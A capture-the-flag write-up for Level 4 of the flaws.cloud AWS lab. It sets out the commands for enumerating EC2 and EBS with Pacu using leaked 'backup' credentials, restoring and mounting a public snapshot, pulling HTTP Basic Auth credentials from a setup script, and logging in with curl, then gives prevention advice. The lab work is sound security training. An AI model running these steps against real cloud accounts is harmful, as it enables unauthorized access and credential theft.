# Level 4 Writeup - Exposed EBS Snapshots

**Completed:** December 3, 2025  
**Assisted by:** Claude (AI pair programming assistant)

---

## Challenge Overview

Level 4 presents a password-protected web page running on an EC2 instance. The challenge hints: "It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it."

**Target:** `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud` (HTTP Basic Auth protected)

## Approach

### Step 1: Reconnaissance with Leaked Credentials

Using the credentials from Level 3 (user: `backup`), we began AWS enumeration:

```bash
aws sts get-caller-identity
```

**Result:**
```json
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

The username "backup" suggested this user might have access to backup-related resources like snapshots.

### Step 2: Enumerating EC2 Resources

Using Pacu (AWS exploitation framework), we enumerated EC2 resources:

```
Pacu> run ec2__enum --regions us-west-2
```

**Result:**
- 1 EC2 instance found
- 1 public IP address
- Various networking components

### Step 3: Discovering EBS Snapshots

We then enumerated EBS volumes and snapshots:

```
Pacu> run ebs__enum_volumes_snapshots --regions us-west-2
```

**Result:**
```
1 volume(s) found
1 snapshot(s) found
Unencrypted snapshot information written to:
  unencrypted_ebs_snapshots_*.csv
```

The CSV revealed:
| Snapshot Name | Snapshot ID | Region |
|--------------|-------------|--------|
| flaws backup 2017.02.27 | snap-0b49342abd1bdcb89 | us-west-2 |

### Step 4: Checking Snapshot Permissions

We checked if the snapshot was publicly accessible:

```bash
aws ec2 describe-snapshot-attribute \
    --snapshot-id snap-0b49342abd1bdcb89 \
    --attribute createVolumePermission \
    --region us-west-2
```

**Result:**
```json
{
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

**Critical Finding:** `"Group": "all"` means this snapshot is **publicly accessible to any AWS account**!

### Step 5: Accessing the Public Snapshot

Since the EBS Direct API doesn't support public snapshots, we used the traditional method:

1. **Created a volume from the snapshot** in our own AWS account:
```bash
aws ec2 create-volume \
    --region us-west-2 \
    --availability-zone us-west-2a \
    --snapshot-id snap-0b49342abd1bdcb89
```

2. **Launched an EC2 instance** and attached the volume

3. **Mounted the volume** to explore its contents:
```bash
sudo mkdir -p /mnt/flaws
sudo mount /dev/xvdf1 /mnt/flaws
ls -la /mnt/flaws
```

### Step 6: Exploring the Snapshot Filesystem

The mounted volume contained a complete Linux filesystem. We explored the home directory:

```bash
ls -la /mnt/flaws/home/ubuntu
```

**Result:**
```
.bash_history
.bashrc
meta-data
setupNginx.sh    # <-- Interesting!
.ssh
...
```

### Step 7: Finding the Credentials

We examined the nginx setup script:

```bash
cat /mnt/flaws/home/ubuntu/setupNginx.sh
```

**Result:**
```bash
htpasswd -b /etc/nginx/.htpasswd flaws [REDACTED]
```

The `htpasswd` command revealed the HTTP Basic Auth credentials in plaintext!

### Step 8: Accessing the Protected Page

Using the discovered credentials:

```bash
curl -u flaws:[REDACTED] http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
```

**Result:** Access granted to Level 5!

### Step 9: Cleanup

We cleaned up all AWS resources to avoid charges:
- Terminated EC2 instance
- Deleted EBS volume
- Deleted security group
- Deleted key pair

## Tools Used

| Tool | Purpose |
|------|---------|
| Pacu | AWS exploitation framework for enumeration |
| `aws ec2 describe-snapshot-attribute` | Checking snapshot permissions |
| `aws ec2 create-volume` | Creating volume from public snapshot |
| `aws ec2 run-instances` | Launching EC2 instance |
| SSH | Accessing the instance to mount and explore |
| `mount` | Mounting the EBS volume |

## Security Concepts

### EBS Snapshot Permissions

EBS snapshots can be shared in three ways:

| Permission | Description | Risk |
|------------|-------------|------|
| Private | Only the owning account | Low |
| Specific Accounts | Shared with listed account IDs | Medium |
| Public (`all`) | Any AWS account can access | **Critical** |

### Why Public Snapshots Are Dangerous

1. **Full disk access** - Snapshots contain complete filesystem images
2. **No authentication needed** - Any AWS account can create a volume
3. **Secrets persist** - Credentials, keys, configs, bash history all included
4. **Hard to detect** - Snapshot access doesn't appear in the original account's logs

### The Attack Chain

```
Leaked AWS Keys → Enumerate Snapshots → Find Public Snapshot → 
Create Volume → Mount Filesystem → Extract Credentials → Access Target
```

## Vulnerability Explained

**The Misconfiguration:** An EBS snapshot was made public, likely accidentally, allowing anyone to access the complete disk contents.

**Why This Happens:**
1. Admin creates snapshot for backup purposes
2. Admin sets `createVolumePermission` to "all" (perhaps confusing it with internal access)
3. Snapshot contains sensitive data from the moment it was created
4. Anyone with an AWS account can now access all data

**What Was Exposed:**
- The `setupNginx.sh` script contained plaintext credentials
- The snapshot was created "shortly after nginx was setup" - capturing the setup script
- HTTP Basic Auth password was exposed

**Real-World Impact:**
- Complete filesystem access to attackers
- All files, credentials, and configurations exposed
- Private keys, database credentials, API tokens at risk
- Bash history may reveal additional secrets

## Prevention

| Prevention | Description |
|------------|-------------|
| **Never make snapshots public** | Default to private, share only with specific account IDs |
| **Encrypt snapshots** | Use AWS KMS encryption for all EBS volumes/snapshots |
| **Audit snapshot permissions** | Regularly scan for public snapshots using AWS Config rules |
| **Use IAM policies** | Restrict who can modify snapshot permissions |
| **Avoid secrets in scripts** | Use AWS Secrets Manager or Parameter Store |
| **Clean up before snapshotting** | Remove sensitive files before creating snapshots |

### AWS Config Rule

```json
{
  "ConfigRuleName": "ebs-snapshot-public-restorable-check",
  "Description": "Checks whether EBS snapshots are public",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "EBS_SNAPSHOT_PUBLIC_RESTORABLE_CHECK"
  }
}
```

## Key Takeaways

1. **EBS snapshots are full disk images** - They contain everything on the volume at snapshot time
2. **Public snapshots are accessible to everyone** - Any AWS account can create a volume and mount it
3. **Secrets in setup scripts persist** - Automation scripts with credentials get captured in snapshots
4. **The `backup` user found the snapshot** - Appropriately named users often have relevant permissions
5. **Always check `createVolumePermission`** - This reveals if a snapshot is public
6. **Encrypt your snapshots** - Encryption prevents unauthorized access even if permissions are wrong

## Progression

| Level | Vulnerability | Access Method |
|-------|--------------|---------------|
| 1 | S3 bucket open to Everyone | Anonymous (`--no-sign-request`) |
| 2 | S3 bucket open to Any Authenticated AWS User | Any AWS credentials |
| 3 | Leaked credentials in git history | Compromised credentials |
| 4 | Public EBS snapshot with credentials | Mount snapshot, extract secrets |

## Next Level

Level 5: `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`

